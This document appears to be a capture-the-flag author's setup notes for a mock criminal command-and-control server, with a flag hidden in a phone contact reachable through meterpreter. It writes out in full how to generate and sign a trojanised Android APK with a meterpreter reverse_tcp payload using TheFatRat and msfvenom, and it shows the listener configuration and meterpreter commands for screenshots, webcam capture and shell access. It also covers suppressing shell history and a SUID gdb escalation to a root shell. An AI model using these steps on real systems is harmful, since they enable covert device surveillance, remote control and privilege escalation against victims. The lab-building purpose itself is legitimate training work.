# amogesus Setup

## Set Timezone

```c
root@swmgc2:~# timedatectl set-timezone Europe/Berlin
```

## Update Server OS

```c
root@swmgc2:~# apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove && apt-get autoclean
```

## Packages

```c
root@swmgc2:~# apt-get install apt-transport-https curl gcc git ncat nmap tmux vim
```

## User Configuration

```c
root@swmgc2:~# useradd -m gangoperator
root@swmgc2:~# passwd gangoperator
root@swmgc2:~# passwd root
root@swmgc2:~# usermod -aG sudo gangoperator
root@swmgc2:~# usermod -s /bin/bash gangoperator
root@swmgc2:~# ln /dev/null ~/.bash_history -sf
gangoperator@swmgc2:~#  ln /dev/null ~/.bash_history -sf
```

## fail2ban

* Copy fail2ban.conf to /etc/fail2ban/
* Copy jail.local to /etc/fail2ban/
* Copy nginx-badbots.conf to /etc/fail2ban/filter.d/
* Copy nginx-noscript.conf /etc/fail2ban/filter.d/

## Update fstab

Add the following line to `/etc/fstab`:

```c
proc  /proc       proc    defaults,hidepid=2    0    0
```

## Nginx

* Copy nginx.conf /etc/nginx/
* Create files folder in /var/www/html
* Set symlink ln -s /etc/nginx/sites-available/website /etc/nginx/sites-enabled/
* Put dropper binary in there

## Enable Services

```c
root@swmgc2:~#  systemctl enable fail2ban
root@swmgc2:~#  systemctl enable nginx
root@swmgc2:~#  systemctl start fail2ban
root@swmgc2:~#  systemctl start nginx
root@swmgc2:~#  systemctl restart sshd
root@swmgc2:~#  systemctl reboot
```

## Metasploit

```c
gangoperator@SWMGC2:~$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

## Welcome Message to new Gang Members

```c
root@SWMGC2:~# cat new_operators.txt 
Welcome to the ShadowWizardMoneyGang C2 Server!

Join us on our Discord server for collaboration and new information
about our targets.

Discord: https://discord.gg/<--- SNIP --->

- WE LOVE DROPIN' SHELLS -


The purple one
```

## Malicious APK

> https://www.apkmirror.com/apk/gears-studios/flappy-bird/flappy-bird-1-3-release/flappy-bird-1-3-android-apk-download/

Select option 1 in `TheFatRat`.

```c
  ===================================================================== 
 |    Create Payload with msfvenom ( must install msfvenom )           | 
  ===================================================================== 
  ___________ 
 |           |======[***       ____                _             
 |  MSFVENOM  \              / ___|_ __ ___  ____| |_ ___  _ __ 
 |_____________\_______      | |   | '__/ _ \/ _  | __/ _ \| '__|
 |==[v1.3 >]===========\     | |___| | |  __/ (_| | || (_) | |   
 |______________________\     \____|_|  \___|\____|\__\___/|_|    
  \(@)(@)(@)(@)(@)(@)(@)/ 
  *********************  

  ===================================================================== 
 |                             Created by  Edo Maland  ( Screetsec )   | 
  ===================================================================== 

        [1]  LINUX >> FatRat.elf
        [2]  WINDOWS >> FatRat.exe
        [3]  SIGNED ANDROID >> FatRat.apk
        [4]  MAC >> FatRat.macho
        [5]  PHP >> FatRat.php
        [6]  ASP >> FatRat.asp
        [7]  JSP >> FatRat.jsp
        [8]  WAR >> FatRat.war
        [9]  Python >> FatRat.py 
        [10] Bash >> FatRat.sh
        [11] Perl >> FatRat.pl
        [12] doc >> Microsoft.doc ( not macro attack )
        [13] rar >> bacdoor.rar ( Winrar old version)
        [14] dll >> FatRat.dll
        [15] Back to Menu 
 
 ┌─[TheFatRat]──[~]─[creator]:
 └─────► 3



[ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ]

   Your local IPV4 address is : <--- SNIP --->
   Your local IPV6 address is : <--- SNIP --->
   Your public IP address is : 
   Your Hostname is : 

   Set LHOST IP: <--- SNIP --->
   Set LPORT: 6969

   Please enter the base name for output files : androiddropper


 
                                    
   +-------------------------------------------+                    
   | [ 1 ] android/meterpreter/reverse_http    |                    
   | [ 2 ] android/meterpreter/reverse_https   |                    
   | [ 3 ] android/meterpreter/reverse_tcp     |                    
   | [ 4 ] android/shell/reverse_http          |                    
   | [ 5 ] android/shell/reverse_https         |                    
   | [ 6 ] android/shell/reverse_tcp           |                    
   +-------------------------------------------+                    
                                    
   Choose Payload : 3               


 
  Generate Backdoor                 
  +------------++-------------------------++-----------------------+
  | Name       ||  Descript               || Your Input             
  +------------++-------------------------++-----------------------+
  | LHOST      ||  The Listen Addres      || <--- SNIP --->          
  | LPORT      ||  The Listen Ports       || 6969                    
  | OUTPUTNAME ||  The Filename output    || androiddropper.apk     
  | PAYLOAD    ||  Payload To Be Used     || android/meterpreter/reverse_tcp                                                            
  +------------++-------------------------++-----------------------+
                                    
                                    
                                    
                                    
[ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  ]

[*] Creating RAT payload with msfvenom                                                               
[✔] Done!                                                                                            
[*] Creating a Valid Certificate                                                                     
[✔] Done!                                                                                            
[*] Signing your payload APK                                                                         
[✔] Done!                                                                                            
                                                                                                     
 Do you want to create a listener for this configuration                                             
 to use in msfconsole in future ?                                                                    
                                                                                                     
Choose y/n : y                                                                                       

 Write the name for this config . (ex : payloadapk)
Filename : androiddropper                                                                            
 
Configuration file saved to /home/user/opt/payloads/TheFatRat/config/listeners/androiddropper.rc     
                                                                                                     
Your payload apk was created and signed , and it is located in : /media/sf_share//androiddropper.apk 
                                                                                                     
Press [ENTER] key to return to menu .
```

The Flag is stored as a `contact` which have to be dumped with `meterpreter`.

Here are the hints:

- Running tmux session in the background
- history file with configuration details
- androiddropper.rc configuration file
- screenshot and screenshare commands in meterpreter_history

```c
gangoperator@SWMGC2:~/.msf4$ ls -la
total 64
drwxrwxr-x 12 gangoperator gangoperator 4096 Jan  6 18:48 .
drwxr-x---  5 gangoperator gangoperator 4096 Jan  6 18:48 ..
-rw-r--r--  1 gangoperator gangoperator  120 Jan  6 18:33 androiddropper.rc
drwxrwxr-x  3 gangoperator gangoperator 4096 Jan  4 23:54 bootsnap_cache
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 data
-rw-r-----  1 gangoperator gangoperator  329 Jan  4 23:55 database.yml
drwx------ 19 gangoperator gangoperator 4096 Jan  6 16:14 db
-rw-rw-r--  1 gangoperator gangoperator  248 Jan  6 18:46 history
-rw-rw-r--  1 gangoperator gangoperator    0 Jan  4 23:55 initial_setup_complete
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 local
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 logos
drwxrwxr-x  3 gangoperator gangoperator 4096 Jan  4 23:55 logs
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 loot
-rw-rw-r--  1 gangoperator gangoperator   40 Jan  6 18:48 meterpreter_history
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 modules
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 plugins
drwxrwxr-x  2 gangoperator gangoperator 4096 Jan  4 23:55 store
```

```c
gangoperator@SWMGC2:~/.msf4$ cat history
exit
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST <--- SNIP --->
set LPORT 6969
run
exit
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST <--- SNIP --->
set LPORT 6969
run
```

```c
gangoperator@SWMGC2:~/.msf4$ cat meterpreter_history 
screenshot
help
screenshare
screenshot
shell
ps
webcam_snap
screenshare
ls
id
exit
```

## Privilege Escalation to root

> https://gtfobins.github.io/gtfobins/gdb/#suid

```c
root@SWMGC2:~# apt-get install gdb
root@SWMGC2:~# chmod +s /usr/bin/gdb
```

```c
gangoperator@SWMGC2:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=1000(gangoperator) gid=1000(gangoperator) euid=0(root) egid=0(root) groups=0(root),1000(gangoperator)
#
```

